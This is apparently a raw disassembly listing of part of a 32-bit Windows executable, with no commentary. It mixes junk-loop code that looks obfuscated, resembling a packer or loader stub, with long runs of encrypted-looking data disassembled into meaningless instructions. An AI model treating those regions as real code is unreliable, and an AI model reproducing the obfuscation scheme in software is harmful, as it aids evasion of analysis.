  409ff9:	push   edi
  409ffa:	test   BYTE PTR [edx-0xa1d55ca],ah
  40a000:	xlat   BYTE PTR ds:[ebx]
  40a001:	popa   
  40a002:	xchg   DWORD PTR [esi+ebp*2-0x75936e85],ebx
  40a009:	jecxz  0x40a03c
  40a00b:	push   eax
  40a00c:	imul   esi,eax,0xfaa7b079
  40a012:	jge    0x40a041
  40a014:	lock imul eax,DWORD PTR [edx+ecx*4-0x6c],0xffffffa8
  40a01a:	scas   al,BYTE PTR es:[edi]
  40a01b:	inc    ecx
  40a01c:	mov    eax,ds:0xb5b1cf34
  40a021:	cmp    bh,dh
  40a023:	(bad)
  40a026:	mov    eax,0x70a78b53
  40a02b:	das    
  40a02c:	add    eax,0x2dcf0b91
  40a031:	cmp    ecx,DWORD PTR [ebp+0x1e]
  40a034:	pushf  
  40a035:	ss and eax,0x7b751cc2
  40a03b:	mov    ecx,DWORD PTR [ebp+0x8]
  40a03e:	mov    DWORD PTR [ecx],eax
  40a040:	jmp    0x40a04c
  40a045:	xor    DWORD PTR [ebp-0x4],0xe149ebf
  40a04c:	mov    ax,WORD PTR [ebp-0x8]
  40a050:	push   DWORD PTR [ebp+0x8]
  40a053:	call   0x40a064
  40a058:	test   eax,eax
  40a05a:	je     0x40a045
  40a060:	leave  
  40a061:	ret    0x4
  40a064:	push   ebp
  40a065:	mov    ebp,esp
  40a067:	sub    esp,0x2c
  40a06a:	and    DWORD PTR ds:0x42a765,0x0
  40a074:	jmp    0x40a084
  40a079:	mov    eax,ds:0x42a765
  40a07e:	inc    eax
  40a07f:	mov    ds:0x42a765,eax
  40a084:	cmp    DWORD PTR ds:0x42a765,0x12
  40a08b:	jae    0x40a110
  40a091:	cmp    DWORD PTR ds:0x42a765,0x22
  40a098:	jne    0x40a0b2
  40a09e:	push   DWORD PTR [ebp-0x14]
  40a0a1:	push   0x6f60
  40a0a6:	push   DWORD PTR [ebp-0x24]
  40a0a9:	push   DWORD PTR [ebp-0x10]
  40a0ac:	call   DWORD PTR ds:0x41d198
  40a0b2:	jmp    0x40a079
  40a0b7:	and    DWORD PTR ds:0x42a871,0x0
  40a0c1:	jmp    0x40a0d1
  40a0c6:	mov    eax,ds:0x42a871
  40a0cb:	inc    eax
  40a0cc:	mov    ds:0x42a871,eax
  40a0d1:	cmp    DWORD PTR ds:0x42a871,0x11
  40a0d8:	jae    0x40a110
  40a0de:	cmp    DWORD PTR ds:0x42a871,0x1e
  40a0e5:	jne    0x40a0fb
  40a0eb:	push   0x89ca
  40a0f0:	push   0x6edd
  40a0f5:	call   DWORD PTR ds:0x41d244
  40a0fb:	jmp    0x40a0c6
  40a100:	mov    ecx,DWORD PTR ds:0x42a78d
  40a106:	mov    eax,ds:0x42a869
  40a10b:	sub    eax,ecx
  40a10d:	xor    ecx,DWORD PTR [ecx+eax*1]
  40a110:	mov    DWORD PTR [ebp-0x8],0xf89c8539
  40a117:	mov    ecx,DWORD PTR ds:0x42a855
  40a11d:	xor    eax,eax
  40a11f:	or     eax,DWORD PTR ds:0x42a891
  40a125:	sub    ecx,eax
  40a127:	imul   ecx,DWORD PTR [ecx+eax*1]
  40a12b:	mov    DWORD PTR [ebp-0x14],0xf89c8538
  40a132:	and    DWORD PTR ds:0x42a761,0x0
  40a13c:	jmp    0x40a14e
  40a141:	mov    ecx,DWORD PTR ds:0x42a761
  40a147:	inc    ecx
  40a148:	mov    DWORD PTR ds:0x42a761,ecx
  40a14e:	cmp    DWORD PTR ds:0x42a761,0x1d
  40a155:	jae    0x40a192
  40a15b:	cmp    DWORD PTR ds:0x42a761,0xb
  40a162:	jne    0x40a173
  40a168:	push   0x3d1a
  40a16d:	call   DWORD PTR ds:0x41d19c
  40a173:	cmp    DWORD PTR ds:0x42a761,0xa
  40a17a:	jne    0x40a18d
  40a180:	mov    ecx,DWORD PTR ds:0x42a761
  40a186:	inc    ecx
  40a187:	mov    DWORD PTR ds:0x42a761,ecx
  40a18d:	jmp    0x40a141
  40a192:	mov    eax,0x9567
  40a197:	mov    WORD PTR [ebp-0x4],ax
  40a19b:	add    DWORD PTR ds:0x42a7bd,ecx
  40a1a1:	jmp    0x40a4ba
  40a1a6:	cmp    al,0xc8
  40a1a8:	ret    0xd2d2
  40a1ab:	ror    ah,cl
  40a1ad:	into   
  40a1ae:	jge    0x40a22b
  40a1b0:	enter  0x8260,0x4d
  40a1b4:	jecxz  0x40a146
  40a1b6:	loop   0x40a1b1
  40a1b8:	js     0x40a232
  40a1ba:	je     0x40a23a
  40a1bc:	js     0x40a236
  40a1be:	xchg   ebx,eax
  40a1bf:	test   eax,0xb5cb4e7b
  40a1c4:	scas   eax,DWORD PTR es:[edi]
  40a1c5:	pop    DWORD PTR [edi]
  40a1c7:	pop    ebp
  40a1c8:	out    dx,eax
  40a1c9:	(bad)  
  40a1ca:	(bad)  
  40a1cb:	adc    eax,0x46f91040
  40a1d0:	mov    bh,0xb5
  40a1d2:	(bad)  
  40a1d3:	jge    0x40a244
  40a1d5:	(bad)  
  40a1d7:	fistp  DWORD PTR [esi+ebx*8-0x1c]
  40a1db:	push   esp
  40a1dc:	and    dh,BYTE PTR [ebp-0x472c402f]
  40a1e2:	add    BYTE PTR [esi-0x13],0xaa
  40a1e6:	push   edx
  40a1e7:	mov    DWORD PTR [eax+ebx*1],edi
  40a1ea:	sbb    DWORD PTR [ebx],ebp
  40a1ec:	bound  edi,QWORD PTR [edi-0x2ab040a8]
  40a1f2:	mov    DWORD PTR cs:[edi+0x6e],edi
  40a1f6:	pop    es
  40a1f7:	push   esp
  40a1f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a1f9:	mov    bl,0xf1
  40a1fb:	pop    ebx
  40a1fc:	stos   DWORD PTR es:[edi],eax
  40a1fd:	daa    
  40a1fe:	in     al,0xdf
  40a200:	jb     0x40a278
  40a202:	daa    
  40a203:	dec    ecx
  40a204:	jmp    0xde342172
  40a209:	popa   
  40a20a:	fs arpl cx,dx
  40a20d:	sbb    dh,dl
  40a20f:	retf   
  40a210:	nop
  40a211:	push   esp
  40a212:	sbb    BYTE PTR [ebx],bh
  40a214:	retf   0x74ce
  40a217:	dec    ecx
  40a218:	mov    eax,ecx
  40a21a:	adc    edi,DWORD PTR [esi-0x6c654e79]
  40a220:	hlt    
  40a221:	neg    DWORD PTR [ebx+0x54855d5]
  40a227:	sbb    edx,eax
  40a229:	ja     0x40a1d4
  40a22b:	(bad)  
  40a22d:	shl    DWORD PTR [ebp+0x26],cl
  40a230:	cmp    edx,DWORD PTR [edx-0x37efed5]
  40a236:	or     al,0xc7
  40a238:	sbb    BYTE PTR [eax+0x27],ch
  40a23b:	shr    BYTE PTR [esi+0xdb44b2b],1
  40a241:	sub    DWORD PTR [eax+0x6edb1629],ebx
  40a247:	sbb    eax,0xffffffe9
  40a24a:	cwde   
  40a24b:	aaa    
  40a24c:	aam    0x9c
  40a24e:	icebp  
  40a24f:	push   ds
  40a250:	add    DWORD PTR [ecx-0x25],edx
  40a253:	in     eax,0xc6
  40a255:	mov    dl,0xe5
  40a257:	push   ss
  40a258:	imul   esi,esp,0xffffffae
  40a25b:	retf   
  40a25c:	jp     0x40a216
  40a25e:	repnz test al,0x37
  40a261:	aas    
  40a262:	fsubr  DWORD PTR [esp+ebp*1]
  40a265:	mov    dl,0xf1
  40a267:	in     al,0xc9
  40a269:	jne    0x40a2e8
  40a26b:	call   0x3add7f27
  40a270:	int    0x96
  40a272:	stos   BYTE PTR es:[edi],al
  40a273:	push   eax
  40a274:	arpl   WORD PTR [ecx-0x64],di
  40a277:	xchg   ecx,eax
  40a278:	xchg   DWORD PTR [ebx],esp
  40a27a:	repnz ror DWORD PTR fs:[edx],1
  40a27e:	fcomp  DWORD PTR [ebx-0x24236ea2]
  40a284:	out    0x42,al
  40a286:	pop    ecx
  40a287:	nop
  40a288:	(bad)  [ebp-0x20]
  40a28b:	adc    BYTE PTR [eax+0x71e02865],bl
  40a291:	out    0xad,al
  40a293:	mov    esp,0x26d5d8e3
  40a298:	jge    0x40a2cf
  40a29a:	and    al,0x12
  40a29c:	ja     0x40a2e9
  40a29e:	data16 icebp 
  40a2a0:	inc    esp
  40a2a1:	shl    BYTE PTR [edx],1
  40a2a3:	mov    esp,0x2d5c8123
  40a2a8:	call   FWORD PTR [edi+0x655b0939]
  40a2ae:	(bad)  
  40a2b0:	inc    ebx
  40a2b1:	mov    cl,0xec
  40a2b3:	out    0xce,al
  40a2b5:	sbb    ch,dh
  40a2b7:	adc    eax,0x2aa6d9c7
  40a2bc:	xchg   ebx,eax
  40a2bd:	sub    al,0x3d
  40a2bf:	jp     0x40a248
  40a2c1:	sbb    al,0xe3
  40a2c3:	loop   0x40a2de
  40a2c5:	repnz sbb DWORD PTR [eax*4+0x153a8156],edi
  40a2cd:	fs add eax,0xee14db2d
  40a2d3:	fmul   DWORD PTR [ebp-0x5094878a]
  40a2d9:	lea    edi,[edi]
  40a2db:	jno    0x40a26c
  40a2dd:	xor    eax,0xf091c887
  40a2e2:	mov    esp,0xab71e161
  40a2e7:	or     DWORD PTR [esi+0x13b46c5],edi
  40a2ed:	jns    0x40a2eb
  40a2ef:	jnp    0x40a352
  40a2f1:	lods   al,BYTE PTR ds:[esi]
  40a2f2:	aaa    
  40a2f3:	xchg   edx,eax
  40a2f4:	xor    dl,ch
  40a2f6:	or     DWORD PTR [ebx+eiz*2-0x6be9afc9],esi
  40a2fd:	cmovnp eax,DWORD PTR [esp+esi*4]
  40a301:	xlat   BYTE PTR ds:[ebx]
  40a302:	adc    BYTE PTR [ebx-0x15],dl
  40a305:	mov    al,0x5d
  40a307:	ss push esp
  40a309:	push   ds
  40a30a:	mov    edx,0x7d8b17ad
  40a30f:	ror    ah,cl
  40a311:	stos   BYTE PTR es:[edi],al
  40a312:	jns    0x40a2d9
  40a314:	and    DWORD PTR [eax+eiz*8+0xc44eaf6],edi
  40a31b:	or     eax,0x679e13d0
  40a320:	loopne 0x40a2b0
  40a322:	fsub   DWORD PTR [edx-0x1c0add66]
  40a328:	adc    ecx,eax
  40a32a:	push   esi
  40a32b:	push   ss
  40a32c:	in     eax,dx
  40a32d:	jg     0x40a31e
  40a32f:	push   esp
  40a330:	retf   
  40a331:	pop    ebp
  40a332:	loopne 0x40a2cf
  40a334:	cwde   
  40a335:	imul   ebx,DWORD PTR [ebx-0x63dcaa24],0x2e
  40a33c:	js     0x40a2eb
  40a33e:	mov    dh,0xaa
  40a340:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a341:	push   cs
  40a342:	xchg   DWORD PTR [ebx+ecx*8-0x6b],esi
  40a346:	xor    eax,0xd54a511c
  40a34b:	addr16 addr16 jmp 0xc5e67206
  40a352:	inc    esp
  40a353:	rcr    DWORD PTR [di-0x6bc8],0x65
  40a359:	ds cli 
  40a35b:	cld    
  40a35c:	inc    eax
  40a35d:	jmp    0x4496b0cf
  40a362:	adc    DWORD PTR ds:0xaaf17ee9,ecx
  40a368:	(bad)  [eax+ecx*4]
  40a36b:	pop    esi
  40a36c:	sbb    bl,BYTE PTR [esi]
  40a36e:	jbe    0x40a3a6
  40a370:	popf   
  40a371:	jg     0x40a3f1
  40a373:	test   al,0xac
  40a375:	pop    es
  40a376:	sar    BYTE PTR [ecx+0x7e],1
  40a379:	ss (bad) 
  40a37b:	lods   eax,DWORD PTR ds:[esi]
  40a37c:	or     al,0x40
  40a37e:	pop    edi
  40a37f:	mov    ebp,0xc76180b7
  40a384:	mov    BYTE PTR [edx+ecx*4],bl
  40a387:	ja     0x40a351
  40a389:	mov    ds:0xb2dc389e,eax
  40a38e:	je     0x40a33d
  40a390:	mov    dh,0xb0
  40a392:	sub    al,0xde
  40a394:	lds    edx,FWORD PTR [eax+0x2b15e729]
  40a39a:	mov    eax,ds:0x4f05c3f1
  40a39f:	lea    edi,[ebx+ebp*1]
  40a3a2:	fsub   st,st(6)
  40a3a4:	or     al,0xfe
  40a3a6:	jno    0x40a3af
  40a3a8:	pop    edi
  40a3a9:	pop    esi
  40a3aa:	push   edi
  40a3ab:	pop    ss
  40a3ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a3ad:	mov    al,BYTE PTR [eax+ebp*4]
  40a3b0:	in     eax,dx
  40a3b1:	out    dx,eax
  40a3b2:	pop    ebx
  40a3b3:	out    0xb3,eax
  40a3b5:	loop   0x40a42f
  40a3b7:	pop    ds
  40a3b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a3b9:	jmp    0x4d1de753
  40a3be:	push   DWORD PTR [ebx-0x6674f904]
  40a3c4:	pop    ss
  40a3c5:	ror    DWORD PTR [edi],cl
  40a3c7:	in     eax,0xa7
  40a3c9:	inc    esi
  40a3ca:	xchg   edx,eax
  40a3cb:	xchg   edi,eax
  40a3cc:	mov    fs,WORD PTR [esi+0x405040fc]
  40a3d2:	int3   
  40a3d3:	jns    0x40a3f2
  40a3d5:	mov    al,ds:0x8c1b3e34
  40a3db:	sub    al,0x91
  40a3dd:	xchg   edi,eax
  40a3de:	imul   esp,eax,0x21
  40a3e1:	pop    esp
  40a3e2:	inc    edi
  40a3e3:	add    BYTE PTR [ebp-0x5f],cl
  40a3e6:	ja     0x40a3ba
  40a3e8:	dec    eax
  40a3e9:	mov    bp,0xe108
  40a3ed:	push   es
  40a3ee:	sbb    ch,dh
  40a3f0:	adc    eax,0x45e217ac
  40a3f5:	xor    esp,DWORD PTR [ebp-0x5e432b1d]
  40a3fb:	sbb    eax,0x73e8ac86
  40a400:	inc    ebp
  40a401:	xchg   DWORD PTR [esi-0x3f],edi
  40a404:	fdiv   DWORD PTR [bx]
  40a407:	pusha  
  40a408:	lock mov ds:0x79a8fa07,al
  40a40e:	xchg   ebx,ecx
  40a410:	lea    esp,[edi]
  40a412:	xlat   BYTE PTR ds:[ebx]
  40a413:	(bad)
  40a416:	cmp    al,BYTE PTR [ebx+ebp*2+0x4133a87a]
  40a41d:	rol    al,1
  40a41f:	push   edi
  40a420:	test   BYTE PTR [ecx-0x244cdeac],ah
  40a426:	xor    eax,0x4e216e6d
  40a42b:	sub    DWORD PTR [ecx+eiz*8-0x3],0x567984e0
  40a433:	adc    al,0x8a
  40a435:	daa    
  40a436:	in     al,dx
  40a437:	xchg   DWORD PTR [edi],edi
  40a439:	jp     0x40a469
  40a43b:	enter  0xf471,0xc2
  40a43f:	loopne 0x40a41d
  40a441:	cmp    eax,0x7062541d
  40a446:	fild   WORD PTR [edi-0x41]
  40a449:	mov    ebx,0xe757a9f1
  40a44e:	int3   
  40a44f:	(bad)  
  40a450:	pop    esp
  40a451:	shr    DWORD PTR [edi+0x66],cl
  40a454:	mov    es,WORD PTR [edx+0x45]
  40a457:	xchg   esi,eax
  40a458:	pop    ecx
  40a459:	sub    eax,0x4f7222b9
  40a45e:	sbb    ch,ch
  40a460:	ins    BYTE PTR es:[edi],dx
  40a461:	and    eax,0x5ba5b7cd
  40a466:	pop    ebx
  40a467:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a468:	or     cl,BYTE PTR [edx]
  40a46a:	(bad)  [ebp+ecx*2-0x6868170b]
  40a471:	addr16 jg 0x40a4de
  40a474:	or     ah,BYTE PTR es:[edx-0x20bde605]
  40a47b:	cmp    eax,0x20c6fd21
  40a480:	in     eax,0x35
  40a482:	and    esp,DWORD PTR [ebx+eax*2+0x5eb25217]
  40a489:	mov    dh,0xb6
  40a48b:	and    ah,cl
  40a48d:	sti    
  40a48e:	outs   dx,DWORD PTR ds:[esi]
  40a48f:	hlt    
  40a490:	iret   
  40a491:	and    ebx,DWORD PTR [esp+eax*8+0x66]
  40a495:	jb     0x40a46f
  40a497:	jmp    0x13979d6d
  40a49c:	xchg   esp,eax
  40a49d:	dec    esi
  40a49e:	jle    0x40a48a
  40a4a0:	call   0x442:0x96c0a20b
  40a4a7:	xchg   esp,eax
  40a4a8:	and    esp,DWORD PTR [eax]
  40a4aa:	out    0x4f,eax
  40a4ac:	xchg   edx,eax
  40a4ad:	and    ecx,DWORD PTR [edx]
  40a4af:	jbe    0x40a478
  40a4b1:	jg     0x40a4e7
  40a4b3:	add    eax,0xdc3378b7
  40a4b8:	popf   
  40a4b9:	lea    eax,es:[ebp-0x24]
  40a4bd:	and    DWORD PTR ds:0x42a7cd,0x42a7f5
  40a4c7:	mov    DWORD PTR [ebp-0x28],eax
  40a4ca:	sub    DWORD PTR ds:0x42a889,0x30d0
  40a4d4:	mov    eax,DWORD PTR [ebp+0x8]
  40a4d7:	or     ecx,0x3ba0
  40a4dd:	mov    DWORD PTR [ebp-0x20],eax
  40a4e0:	and    DWORD PTR ds:0x42a771,0x0
  40a4ea:	mov    ecx,DWORD PTR ds:0x42a771
  40a4f0:	inc    ecx
  40a4f1:	mov    DWORD PTR ds:0x42a771,ecx
  40a4f7:	cmp    DWORD PTR ds:0x42a771,0xc
  40a4fe:	jne    0x40a50d
  40a504:	push   DWORD PTR [ebp-0x24]
  40a507:	call   DWORD PTR ds:0x41d1a0
  40a50d:	cmp    DWORD PTR ds:0x42a771,0xb
  40a514:	jne    0x40a527
  40a51a:	mov    ecx,DWORD PTR ds:0x42a771
  40a520:	inc    ecx
  40a521:	mov    DWORD PTR ds:0x42a771,ecx
  40a527:	cmp    DWORD PTR ds:0x42a771,0x15
  40a52e:	jb     0x40a4ea
  40a534:	push   ebx
  40a535:	lea    eax,[ebp-0x18]
  40a538:	mov    ebx,DWORD PTR ds:0x42a79d
  40a53e:	mov    ecx,DWORD PTR ds:0x42a851
  40a544:	sub    ecx,ebx
  40a546:	and    ebx,DWORD PTR [ebx+ecx*1]
  40a549:	mov    DWORD PTR [ebp-0x1c],eax
  40a54c:	mov    eax,DWORD PTR [ebp-0x1c]
  40a54f:	and    DWORD PTR ds:0x42a881,0x0
  40a559:	jmp    0x40a56d
  40a55e:	xor    ebx,ebx
  40a560:	add    ebx,DWORD PTR ds:0x42a881
  40a566:	inc    ebx
  40a567:	mov    DWORD PTR ds:0x42a881,ebx
  40a56d:	cmp    DWORD PTR ds:0x42a881,0x15
  40a574:	jae    0x40a597
  40a57a:	cmp    DWORD PTR ds:0x42a881,0x25
  40a581:	jne    0x40a592
  40a587:	push   0x6372
  40a58c:	call   DWORD PTR ds:0x41d0cc
  40a592:	jmp    0x40a55e
  40a597:	push   esi
  40a598:	and    DWORD PTR ds:0x42a849,0x0
  40a5a2:	mov    ebx,DWORD PTR ds:0x42a849
  40a5a8:	inc    ebx
  40a5a9:	mov    DWORD PTR ds:0x42a849,ebx
  40a5af:	cmp    DWORD PTR ds:0x42a849,0x7
  40a5b6:	jne    0x40a5dc
  40a5bc:	push   DWORD PTR [ebp-0x14]
  40a5bf:	push   0x2cb6
  40a5c4:	push   DWORD PTR [ebp-0x1c]
  40a5c7:	push   0x8d7c
  40a5cc:	push   0x42aa62
  40a5d1:	push   0x400000
  40a5d6:	call   DWORD PTR ds:0x41d248
  40a5dc:	cmp    DWORD PTR ds:0x42a849,0x6
  40a5e3:	jne    0x40a5f6
  40a5e9:	mov    ebx,DWORD PTR ds:0x42a849
  40a5ef:	inc    ebx
  40a5f0:	mov    DWORD PTR ds:0x42a849,ebx
  40a5f6:	cmp    DWORD PTR ds:0x42a849,0x1b
  40a5fd:	jb     0x40a5a2
  40a603:	push   edi
  40a604:	mov    edi,0xf89f2e50
  40a609:	jmp    0x40a922
  40a60e:	(bad)  
  40a60f:	ror    bh,0xca
  40a612:	int    0xd9
  40a614:	(bad)  
  40a616:	dec    eax
  40a617:	xor    BYTE PTR [edi+edi*2+0x6f],dh
  40a61b:	(bad)  
  40a61c:	mov    bh,0xe3
  40a61e:	fdivp  st(6),st
  40a620:	js     0x40a69a
  40a622:	je     0x40a6a2
  40a624:	js     0x40a69e
  40a626:	bound  eax,QWORD PTR [ebp-0x76519c07]
  40a62c:	jecxz  0x40a5b6
  40a62e:	jb     0x40a674
  40a630:	repnz push 0x86104635
  40a636:	xchg   BYTE PTR [ebx],ch
  40a638:	fimul  DWORD PTR [esi]
  40a63a:	rcr    dl,1
  40a63c:	out    0xc2,eax
  40a63e:	clc    
  40a63f:	rol    BYTE PTR [ebx-0x1eb48191],cl
  40a645:	xor    bl,dl
  40a647:	scas   al,BYTE PTR es:[edi]
  40a648:	adc    BYTE PTR [ecx+eax*4+0x24],bl
  40a64c:	cmp    eax,0x277f9bc5
  40a651:	bound  edi,QWORD PTR [esi]
  40a653:	lock mov ?,esp
  40a656:	pop    ecx
  40a657:	xor    eax,0xd249ba21
  40a65c:	loope  0x40a688
  40a65e:	iret   
  40a65f:	inc    ecx
  40a660:	add    bh,BYTE PTR [eax-0x12980f08]
  40a666:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a667:	hlt    
  40a668:	scas   al,BYTE PTR es:[edi]
  40a669:	push   ebx
  40a66a:	aad    0x19
  40a66c:	mov    eax,ds:0xe41834c5
  40a671:	popa   
  40a672:	leave  
  40a673:	pop    ebx
  40a674:	or     edi,DWORD PTR [ecx+0x54]
  40a677:	rcl    BYTE PTR [esi],1
  40a679:	xor    DWORD PTR [edi],edi
  40a67b:	mov    DWORD PTR [ebx+0x11cf5726],eax
  40a681:	fldcw  WORD PTR [eax]
  40a683:	nop
  40a684:	stos   DWORD PTR es:[edi],eax
  40a685:	in     al,0xd2
  40a687:	and    al,0x24
  40a689:	and    DWORD PTR [ebx-0x46e504b],0x8341ac31
  40a693:	push   es
  40a694:	add    esi,esi
  40a696:	jmp    0x7a6:0xfcd49acf
  40a69d:	stc    
  40a69e:	add    BYTE PTR [eax+0x4f],dh
  40a6a1:	dec    esp
  40a6a2:	mov    edx,0x7de43d88
  40a6a7:	jmp    0x40a653
  40a6a9:	ret    0x8ddc
  40a6ac:	rol    BYTE PTR [edi+0xe],0xca
  40a6b0:	scas   al,BYTE PTR es:[edi]
  40a6b1:	sub    bh,BYTE PTR [ebx+eiz*1-0x3c253142]
  40a6b8:	add    ecx,esp
  40a6ba:	hlt    
  40a6bb:	or     eax,0x50d7b481
  40a6c0:	test   DWORD PTR [ebx+0x54ed0d5b],esp
  40a6c6:	xchg   esi,eax
  40a6c7:	std    
  40a6c8:	in     eax,dx
  40a6c9:	sub    DWORD PTR fs:[ebp+0x624993dc],0xfffffffc
  40a6d1:	jmp    0xad39:0x31fd7bea
  40a6d8:	xchg   esp,eax
  40a6d9:	xchg   edx,eax
  40a6da:	mov    esp,DWORD PTR [edx+0x21e4ec26]
  40a6e0:	fist   DWORD PTR ds:0x98c4459e
  40a6e6:	adc    ebp,ebp
  40a6e8:	jl     0x40a740
  40a6ea:	sub    BYTE PTR [esi-0x3d7885fd],ch
  40a6f0:	clc    
  40a6f1:	ins    BYTE PTR es:[edi],dx
  40a6f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a6f3:	add    dl,bh
  40a6f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a6f6:	mov    eax,ds:0xa5aeae85
  40a6fb:	jo     0x40a6b0
  40a6fd:	xchg   ebp,eax
  40a6fe:	call   0x65e5:0x77cbc60d
  40a705:	enter  0x3f92,0x17
  40a709:	lea    edx,[ebx+0x5d2dca03]
  40a70f:	or     eax,0x28693efd
  40a714:	mov    bh,0x4c
  40a716:	lds    eax,FWORD PTR [ebx]
  40a718:	mov    edi,0xaede811e
  40a71d:	push   edi
  40a71e:	test   esp,esi
  40a720:	test   eax,0x484422af
  40a725:	add    dh,BYTE PTR [edx+0x66]
  40a728:	cdq    
  40a729:	xor    edx,DWORD PTR [ebx]
  40a72b:	enter  0xcdb5,0xc7
  40a72f:	aas    
  40a730:	push   0xffffffeb
  40a732:	test   DWORD PTR [ebp-0x776b0205],esi
  40a738:	xchg   edi,eax
  40a739:	jno    0x40a7b0
  40a73b:	fucomi st,st(5)
  40a73d:	cmp    dh,ah
  40a73f:	imul   esp,DWORD PTR [ecx+0x6cdca13c],0x3b
  40a746:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a747:	mov    ds:0xe4a9e877,eax
  40a74c:	and    bh,BYTE PTR [ebx+0x72]
  40a74f:	imul   esp,DWORD PTR [ebx],0x16dde5ae
  40a755:	mov    ch,0xa3
  40a757:	pushf  
  40a758:	mov    esi,0x1befae91
  40a75d:	hlt    
  40a75e:	push   ebp
  40a75f:	lods   eax,DWORD PTR ds:[esi]
  40a760:	out    0x0,al
  40a762:	or     DWORD PTR [ecx+0x4a],ecx
  40a765:	or     bh,ah
  40a767:	push   esi
  40a768:	das    
  40a769:	cmp    al,0x7b
  40a76b:	jmp    0x4ecc:0xb2830703
  40a772:	pslld  mm5,QWORD PTR ds:0x9ff33e7d
  40a779:	retf   0xf6f8
  40a77c:	lahf   
  40a77d:	or     cl,BYTE PTR [esi+0x2d]
  40a780:	(bad)  
  40a781:	mov    eax,0xf48cbf9a
  40a786:	jns    0x40a7f9
  40a788:	call   0x3d31:0xd2b45967
  40a78f:	push   ecx
  40a790:	dec    edi
  40a791:	addr16 inc esp
  40a793:	and    edi,ecx
  40a795:	or     esi,DWORD PTR [ebp+ebp*2-0x41194bc]
  40a79c:	imul   BYTE PTR [ebp-0x2135e14d]
  40a7a2:	ss jns 0x40a775
  40a7a5:	ins    BYTE PTR es:[edi],dx
  40a7a6:	fstp   DWORD PTR [ecx-0x65260f34]
  40a7ac:	(bad)  
  40a7ad:	fnstenv [esi-0x4e]
  40a7b0:	test   eax,0x8e76354f
  40a7b5:	pop    edx
  40a7b6:	bound  edi,QWORD PTR [edi-0x40]
  40a7b9:	lea    bx,[edx+0x6f454c40]
  40a7c0:	ret    0xbae4
  40a7c3:	out    dx,eax
  40a7c4:	and    BYTE PTR [ecx+0x62],bh
  40a7c7:	mov    BYTE PTR [edx-0x5d],0x9
  40a7cb:	into   
  40a7cc:	stc    
  40a7cd:	push   es
  40a7ce:	xchg   esp,eax
  40a7cf:	adc    eax,0x9dc7cc3
  40a7d4:	or     DWORD PTR [esi+0x73],esp
  40a7d7:	call   0xb5af021a
  40a7dc:	push   es
  40a7dd:	mov    eax,ds:0x5177e253
  40a7e2:	add    bl,BYTE PTR [edx+0x36]
  40a7e5:	jnp    0x40a82d
  40a7e7:	push   edx
  40a7e8:	jle    0x40a847
  40a7ea:	sub    ch,BYTE PTR [ebp-0x56]
  40a7ed:	out    dx,al
  40a7ee:	sbb    al,0xc5
  40a7f0:	push   ebx
  40a7f1:	ror    BYTE PTR [esp+ecx*1-0x45eb8090],0x54
  40a7f9:	mov    bh,0xc7
  40a7fb:	pop    esi
  40a7fc:	lock cmp bl,BYTE PTR [ebx]
  40a7ff:	xor    esp,DWORD PTR [ebx-0x6e202f81]
  40a805:	mov    edx,0x34e924f
  40a80a:	outs   dx,DWORD PTR ds:[esi]
  40a80b:	shr    BYTE PTR [edx+0x6587bf7e],0x52
  40a812:	aaa    
  40a813:	sub    DWORD PTR [ebx-0x33ddc644],edx
  40a819:	fdiv   DWORD PTR [ebx+0x2fd71c52]
  40a81f:	lds    ecx,FWORD PTR [ebx]
  40a821:	push   esi
  40a822:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a823:	cld    
  40a824:	adc    esp,DWORD PTR [ebx]
  40a826:	lahf   
  40a827:	pushf  
  40a828:	in     eax,0xc4
  40a82a:	test   al,0x52
  40a82c:	lods   al,BYTE PTR ds:[esi]
  40a82d:	cmp    DWORD PTR [edx-0x4c585ae3],ecx
  40a833:	in     al,dx
  40a834:	mov    BYTE PTR [ebx-0x7e033962],al
  40a83a:	mov    ah,BYTE PTR [ebx+0x5f]
  40a83d:	inc    edx
  40a83e:	or     al,0x31
  40a840:	loop   0x40a7f7
  40a842:	or     esp,ebx
  40a844:	mov    esi,0x67f5a1ad
  40a849:	cdq    
  40a84a:	mul    BYTE PTR [edx-0x52993ce8]
  40a850:	dec    edx
  40a851:	mov    ds:0x58b5eb77,al
  40a856:	pop    edi
  40a857:	ja     0x40a81a
  40a859:	add    al,0xb4
  40a85b:	lods   eax,DWORD PTR ds:[esi]
  40a85c:	adc    ebp,DWORD PTR [eax-0x5d]
  40a85f:	repz data16 ror BYTE PTR fs:[eax+0x128e0ba4],1
  40a868:	fidiv  WORD PTR [ebx+ebp*2-0x661ae247]
  40a86f:	xor    bl,BYTE PTR [ebp*2-0x713e9bd5]
  40a876:	mov    esp,0x405c6bdf
  40a87b:	scas   al,BYTE PTR es:[edi]
  40a87c:	push   edi
  40a87d:	dec    eax
  40a87e:	inc    esi
  40a87f:	or     BYTE PTR [edi-0x48],bl
  40a882:	xor    al,0x6c
  40a884:	fcomp  QWORD PTR [ebx+0x4d]
  40a887:	push   edi
  40a888:	mov    edx,0x1e3620d
  40a88d:	cwde   
  40a88e:	adc    eax,0x3a2c3b11
  40a893:	ins    BYTE PTR es:[edi],dx
  40a894:	nop
  40a895:	cmp    eax,0xf6da79c7
  40a89a:	xchg   edi,eax
  40a89b:	jp     0x40a857
  40a89d:	(bad)  
  40a89f:	mov    BYTE PTR [edx-0x42e3c504],bl
  40a8a5:	mov    ebx,DWORD PTR [ebp-0x72]
  40a8a8:	push   esi
  40a8a9:	mov    dh,0xa6
  40a8ab:	adc    DWORD PTR cs:[ebx+0xd],esp
  40a8af:	hlt    
  40a8b0:	cmp    DWORD PTR [edx],0x80d051f7
  40a8b6:	iret   
  40a8b7:	jbe    0x40a84b
  40a8b9:	div    BYTE PTR [eax]
  40a8bb:	or     dh,al
  40a8bd:	mov    cl,0x9d
  40a8bf:	out    0xf3,al
  40a8c1:	or     edx,esi
  40a8c3:	repz mov esi,0xab3a46be
  40a8c9:	cmp    al,0x8d
  40a8cb:	inc    eax
  40a8cc:	or     eax,0xecc6e4c0
  40a8d1:	sahf   
